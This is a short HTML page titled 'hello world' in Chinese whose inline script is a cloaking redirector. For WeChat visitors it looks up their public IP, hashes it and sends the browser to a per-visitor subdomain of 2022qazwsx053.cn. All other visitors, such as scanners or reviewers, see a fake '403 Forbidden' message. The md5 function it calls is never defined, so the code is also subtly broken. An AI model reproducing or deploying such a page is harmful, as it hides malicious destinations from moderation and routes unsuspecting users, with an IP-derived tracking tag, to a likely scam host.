<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>你好，世界</title>

    

<body>

    <script>
var userAgent = navigator.userAgent;

// 判断是否在微信环境中访问
if (userAgent.indexOf('MicroMessenger') !== -1) {
    // 获取当前用户IP
    var userIp = '';

    // 通过异步请求获取用户IP
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.ipify.org?format=json', true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var response = JSON.parse(xhr.responseText);
            userIp = response.ip;
            redirectToDomain(userIp);
        }
    };
    xhr.send();

    // 将IP转化为特定的32位字符
    function convertIPToHash(ip) {
        return md5(ip);
    }

    // 执行重定向操作
    function redirectToDomain(ip) {
        var hash = convertIPToHash(ip);
        var domain = '2022qazwsx053.cn';
        var redirectUrl = 'http://' + hash + '.' + domain;

        // 执行301重定向跳转
        window.location.href = redirectUrl;
    }
} else {
    // 非微信环境下显示403 Forbidden错误
    document.write('<h1>403 Forbidden</h1>');
}
    </script>
</body>
</html>
